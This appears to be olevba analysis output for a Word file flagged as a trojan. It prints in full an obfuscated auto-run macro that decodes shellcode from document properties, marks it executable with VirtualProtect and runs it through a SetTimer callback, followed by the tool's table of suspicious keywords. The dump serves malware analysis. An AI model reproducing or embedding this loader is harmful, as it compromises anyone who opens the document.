olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-7acf9a5e1447be7e3303b92392839f4b5c2c0c86d0d5ae7d788ef9698c600157
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-7acf9a5e1447be7e3303b92392839f4b5c2c0c86d0d5ae7d788ef9698c600157 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function HolometabolyEthiopian Lib "user32" Alias "KillTimer" (ByVal BardletUndivorcing As LongPtr, ByVal MolrookenMonoliteral As LongPtr) As LongPtr
#Else
Private Declare Function RetrievalRemittances Lib "user32" Alias "SetTimer" ( ByVal SemicastrationFotchSultaness As Long, ByVal MisincitePermirific As Long, ByVal NontrivialityCesspoolTariff As Long, ByVal ReconstituteLimitational As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function RetrievalRemittances Lib "user32" Alias "SetTimer" (ByVal PolychaetanLatifoliaSupererogate As LongPtr, ByVal BimucronateAcarids As LongPtr, ByVal AutotropicallySubglottallyRotal As LongPtr, ByVal GneissoidHypocone As LongPtr) As LongPtr
Private Declare PtrSafe Function IneffectualityPerfunctory Lib "kernel32" Alias "VirtualProtect" (ByVal CelloidFivescore As LongPtr, ByVal BronchophthisisMetanetwork As LongPtr, ByVal TrimacerOverluxurious As LongPtr, CounterhypothesisComplaintsCollencyte As LongPtr) As LongPtr
#Else
Private Declare Function IneffectualityPerfunctory Lib "kernel32" Alias "VirtualProtect"  (ByVal FilliesReilluminatedShantying As Long, ByVal EsebriasSubjugating As Long, ByVal EvequeBenderPlowhead As Long, ElegizesAnnexionNavarrian As Long) As Long
Private Declare Function HolometabolyEthiopian Lib "user32" Alias "KillTimer" ( ByVal UnrequickenedAtaxy As Long, ByVal BabasDharani As Long) As Long
#End If
Private Sub Document_Open()
Dim SubtereteDehydrogenatingEutocia() As Byte
#If Win64 Then
SubtereteDehydrogenatingEutocia = ComplaininglyMonoidVersatec(ActiveDocument.BuiltInDocumentProperties(OJkwtbDO2B("tLJI9kNK")).Value)
#Else
SubtereteDehydrogenatingEutocia = ComplaininglyMonoidVersatec(ActiveDocument.BuiltInDocumentProperties(OJkwtbDO2B("IkWnoGAcbf")).Value)
#End If
#If VBA7 Then
Dim SertulumAgnosy As LongPtr
Dim DisentitledQuamoclit As LongPtr
Dim WaterhorseTailskidsEpipolize As LongPtr
Dim FrailejonDaker As LongPtr
#Else
Dim SertulumAgnosy As Long
Dim DisentitledQuamoclit As Long
Dim WaterhorseTailskidsEpipolize As Long
Dim FrailejonDaker As Long
#End If
DisentitledQuamoclit = UBound(SubtereteDehydrogenatingEutocia) + 1
WaterhorseTailskidsEpipolize = VarPtr(SubtereteDehydrogenatingEutocia(0))
IneffectualityPerfunctory WaterhorseTailskidsEpipolize, DisentitledQuamoclit, 64, VarPtr(SertulumAgnosy)
GetObject(OJkwtbDO2B("NYlFmyL2b1X")).Environment(OJkwtbDO2B("WNApCvazPI1"))(OJkwtbDO2B("Xf4W41JWS")) = ActiveDocument.FullName
GetObject(OJkwtbDO2B("paiE17JUJX")).Environment(OJkwtbDO2B("asAnMRUD7"))(OJkwtbDO2B("oMLdJusn")) = OJkwtbDO2B("rHZyvQppI2")
If True Then
FrailejonDaker = RetrievalRemittances(0, WaterhorseTailskidsEpipolize, 1, WaterhorseTailskidsEpipolize)
AbidingArsono 1
HolometabolyEthiopian 0, FrailejonDaker
End If
GetObject(OJkwtbDO2B("tlNuAzuRL")).Environment(OJkwtbDO2B("FACTp54Z2H1")).Remove (OJkwtbDO2B("ziG4UgVOiKs"))
GetObject(OJkwtbDO2B("bjoLERk3")).Environment(OJkwtbDO2B("qPgOHHq7t")).Remove (OJkwtbDO2B("iPyc3AyUE"))
ReDim SubtereteDehydrogenatingEutocia(1)
End Sub
Sub AbidingArsono(Finish)
Dim CaldadariaLeadline As Long
Dim PollinoseUndistractedness As Long
PollinoseUndistractedness = Timer() + (Finish)
Do
CaldadariaLeadline = Timer()
DoEvents
Loop Until CaldadariaLeadline > PollinoseUndistractedness
End Sub
Public Function OJkwtbDO2B(strInput)
OJkwtbDO2B = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function SinologerKitmanRoemers(ReutteranceKnifeHumaniform, RacierCourtezanship)
SinologerKitmanRoemers = Mid(ReutteranceKnifeHumaniform, RacierCourtezanship + 1, 1)
End Function
Function CriminatedJuicier(PeriesophagitisEsperantidoSelsyns) As Long
If Int(Rnd(23)) > 2 Then
CriminatedJuicier = 9000
Else
CriminatedJuicier = Len(PeriesophagitisEsperantidoSelsyns)
End If
End Function
Function ComplaininglyMonoidVersatec(WasteweirPitahayaAnoestrous)
ReDim FuturalMyelination(CriminatedJuicier(WasteweirPitahayaAnoestrous) - 1) As Byte
Dim AlarmistUndecayable As Long, PrevueParviscient As Long
Dim StromScriptitoryPerturbant: StromScriptitoryPerturbant = OJkwtbDO2B("unvb02618") & OJkwtbDO2B("vVIJFlrPtt")
For AlarmistUndecayable = 0 To CriminatedJuicier(WasteweirPitahayaAnoestrous) - 1 Step 2
PrevueParviscient = AlarmistUndecayable / 2
FuturalMyelination(PrevueParviscient) = CDec(StromScriptitoryPerturbant & SinologerKitmanRoemers(WasteweirPitahayaAnoestrous, AlarmistUndecayable) & SinologerKitmanRoemers(WasteweirPitahayaAnoestrous, AlarmistUndecayable + 1))
Next
ComplaininglyMonoidVersatec = FuturalMyelination
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

